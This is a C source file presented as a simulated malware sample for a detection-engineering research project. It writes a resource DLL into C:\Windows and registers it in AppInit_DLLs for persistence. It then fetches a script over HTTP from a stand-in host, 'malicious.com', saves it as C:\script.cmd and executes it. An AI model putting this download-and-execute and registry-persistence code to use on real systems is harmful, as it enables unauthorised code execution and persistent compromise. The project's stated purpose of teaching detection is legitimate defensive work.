/*
 * This file contains a simulated malware sample that attempts to:
 *	1. Write a DLL file to C:\Windows\
 *		a. The DLL is contained in the resources section of this
 *		   executable.
 *		b. The DLL hooks FindNextFileW to hide the presence
 *		   of filemanager.exe.
 *  2. Add the DLL to AppInit_DLLs
 *  3. Enable AppInit_DLLs 
 *  4. Establish a connection to a remote server (in this case malicious.com).
 *  5. Download, write, and execute a file retrieved from the remote server.
 * 
 *  This sample file is intended for use to demonstrate detection engineering
 *  principles and would serve no purpose in a real world engagment. All of the
 *  functionality of this program is contrived, FindNextFileW isn't used internally
 *  by Windows to enumerate files, so the malicious DLL included doesn't actually
 *  hide it's presence.
 * 
 *  Rather this program is designed to simulate the processes malware might take to achieve 
 *  objectives in a real word context (using MHook, editing registry, estbalishing remote
 *  connections, retrieving data, writing and executing files). This file is part of a research
 *  project on capability abstraction and detection engineering: 
 * 
 *  https://github.com/NWc0de/DetectionEngineeringDemo
 * 
 *  This file is part of version 1: basic methodology.
 * 
 *  Spencer Litte - mrlittle@uw.edu 
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "libloaderapi.h"
#include "resource.h"

#pragma comment(lib, "Ws2_32.lib")

#define ERRMSG_LEN 256
#define RECV_FAILURE 1
#define WRITE_SUCCESS 0
#define WRITE_FAILURE -1
#define DEFAULT_PORT "80"
#define SCRIPT_LEN 1028

const wchar_t* DLL_RES_TYPE = L"DLL";
const wchar_t* SCRIPT_URL = L"C:\\script.cmd";
const wchar_t* DLL_URL = L"C:\\Windows\\filesearch.dll";
const char* DLL_REG = " C:\\Windows\\filesearch.dll";
const char* APP_INIT = "AppInit_DLLs";
const char* APP_INIT_TOGGLE = "LoadAppInit_DLLs";
const char* WIN_REGKEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"; 
const char* HOST = "malicious.com";
const char* QUERY = "GET /script.sh HTTP/1.1\r\nHost: malicious.com\r\n\r\n";

int WriteFileSearchDll(const wchar_t*);
int AddDllToAppInit();
int ConnectHost(const char*, SOCKET*);
int RetrieveScript(SOCKET, char*);
void PrintError(const wchar_t*);


int main() {
	SOCKET sock;
	int recvd, written;
	char* res_buf = (char*)malloc(SCRIPT_LEN), * hend;
	FILE* write_url;
	if (WriteFileSearchDll(DLL_URL) == WRITE_SUCCESS) {
		AddDllToAppInit();
	}

	ConnectHost(HOST, &sock);
	if (sock != INVALID_SOCKET) {
		recvd = RetrieveScript(sock, res_buf);
	}

	if (recvd != RECV_FAILURE) {
		_wfopen_s(&write_url, SCRIPT_URL, L"wb");

		if (write_url) {
			hend = strstr(res_buf, "\r\n\r\n");
			written = fwrite(hend + 4, sizeof(char), recvd - (hend + 4 - res_buf), write_url);
			fclose(write_url);
		}
	}

	_wsystem(SCRIPT_URL);
}

/*
 * Sends a GET request for script.cmd to malicious.com. Note that in this example 
 * malicious.com is an arbitrary domain name that is used a placeholder in an isolated
 * lab network. Attempting to run this program outside of a lab environemnt will
 * produce non-deterministic results.
 * 
 * Method provided by https://docs.microsoft.com/en-us/windows/win32/winsock/getting-started-with-winsock
 * 
 * arg: sock (SOCKET): an open socket that will be used to communicate with
 *					   the server providing script.cmd
 * 
 * arg: recvbuf (char*): a pointer to an initialized buffer that will receive
 *						 script.cmd
 * 
 */
int RetrieveScript(SOCKET sock, char* recvbuf) {
	int iResult, recvd;

	// Send an initial buffer
	iResult = send(sock, QUERY, (int)strlen(QUERY), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return RECV_FAILURE;
	}

	// shutdown the connection for sending since no more data will be sent
	// the client can still use the ConnectSocket for receiving data
	iResult = shutdown(sock, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed: %d\n", WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return RECV_FAILURE;
	}

	recvd = recv(sock, recvbuf, SCRIPT_LEN, 0);
	if (recvd == SOCKET_ERROR) {
		return RECV_FAILURE;
	}

	return recvd;
}

/*
 * Creates a socket connected to the provided host.
 * 
 * Method provided by https://docs.microsoft.com/en-us/windows/win32/winsock/getting-started-with-winsock
 * 
 * arg: url (const char*): a string representing the url to connect
 *						   to
 * arg: sock (SOCET*): a pointer to the socket var that will contain the
 *					   created socket. If socket creation is not successful
 *					   sock will point to INVALID_SOCKET
 */
int ConnectHost(const char* url, SOCKET* sock) {
	WSADATA wsaData;
	int iResult;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed: %d\n", iResult);
		return 1;
	}

	struct addrinfo* result = NULL, hints;
	SecureZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(url, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	*sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (*sock == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Connect to server.
	iResult = connect(*sock, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(*sock);
		*sock = INVALID_SOCKET;
	}

	freeaddrinfo(result);

	if (*sock == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}
}

/*
 * Adds filesearch.dll to AppInit_DLLs.
 * 
 * return: WRITE_SUCCESS if the filesearch.dll was successfully written to the
 *		   registry, WRITE_FAILURE otherwise
 */
int AddDllToAppInit() {
	HKEY ai_key;
	char* ai_dlls;
	int dll_len = strlen(DLL_REG), blen;
	DWORD en_init = 1, len;
	LSTATUS res = RegOpenKeyExA(HKEY_LOCAL_MACHINE, WIN_REGKEY, NULL, KEY_ALL_ACCESS, &ai_key);

	if (res != ERROR_SUCCESS) {
		PrintError(L"Failed to open registry key");
		return WRITE_FAILURE;
	}

	res = RegGetValueA(ai_key, NULL, APP_INIT, RRF_RT_REG_SZ, NULL, NULL, &len);
	blen = len + dll_len + 1;
	ai_dlls = (char*) malloc(blen);
	res = RegGetValueA(ai_key, NULL, APP_INIT, RRF_RT_REG_SZ, NULL, ai_dlls, &len);

	do {
		blen = blen * 2;
		ai_dlls = (char*)malloc(blen);
		res = RegGetValueA(ai_key, NULL, APP_INIT, RRF_RT_REG_SZ, NULL, ai_dlls, &len);
	} while (res == ERROR_MORE_DATA);

	if (res != ERROR_SUCCESS) {
		PrintError(L"Failed to retrieve AppInit_DLL value");
		return WRITE_FAILURE;
	}

	for (int i = 0; i < dll_len; i++) {
		*(ai_dlls + (len - 1) + i) = *(DLL_REG + i);
	}

	*(ai_dlls + len + dll_len - 1) = ' ';
	res = RegSetValueExA(ai_key, APP_INIT, NULL, RRF_RT_REG_SZ, (BYTE*)ai_dlls, len + dll_len);

	if (res != ERROR_SUCCESS) {
		PrintError(L"Failed to write to registry");
		return WRITE_FAILURE;
	}

	RegSetValueExA(ai_key, APP_INIT_TOGGLE, NULL, REG_DWORD, (BYTE*)&en_init, 1);
	RegCloseKey(ai_key);
	return WRITE_SUCCESS;
}


/*
 * Loads the FileSearch dll from memory and writes it to the provided URL.
 * 
 * arg: dll_url (const char*): a string containing the url to which the FileSearch
 *							    dll will be written
 * 
 * return: WRITE_SUCCESS if the file was successfully written, WRITE_FAILURE otherwise
 */
int WriteFileSearchDll(const wchar_t* dll_url) {
	char *errmsg = NULL;
	FILE* write_url;
	HRSRC dll_res = FindResourceW(NULL, MAKEINTRESOURCE(IDR_DLL1), DLL_RES_TYPE);
	DWORD dll_size = SizeofResource(NULL, dll_res);
	HGLOBAL dll_mem = LoadResource(NULL, dll_res);
	_wfopen_s(&write_url, dll_url, L"wb");

	if (write_url && dll_mem) {
		fwrite(dll_mem, sizeof(char), dll_size, write_url);
		fclose(write_url);
	} else if (dll_mem) {
		PrintError(L"Unable to open file for writing");
		return WRITE_FAILURE;
	} else {
		PrintError(L"Failed to load resource");
		return WRITE_FAILURE;
	}
	return WRITE_SUCCESS;
}

/*
 * Prints error details using strerror and the provided string.
 * 
 * arg: msg (const char*) a string that is prepended to the error
 *                         message generated by strerror
 */
void PrintError(const wchar_t* msg) {
	wchar_t* errmsg = (wchar_t*)malloc(sizeof(wchar_t) * ERRMSG_LEN);
	_wcserror_s(errmsg, ERRMSG_LEN, errno);
	fwprintf(stderr, L"%s: %s\n", msg, errmsg);
}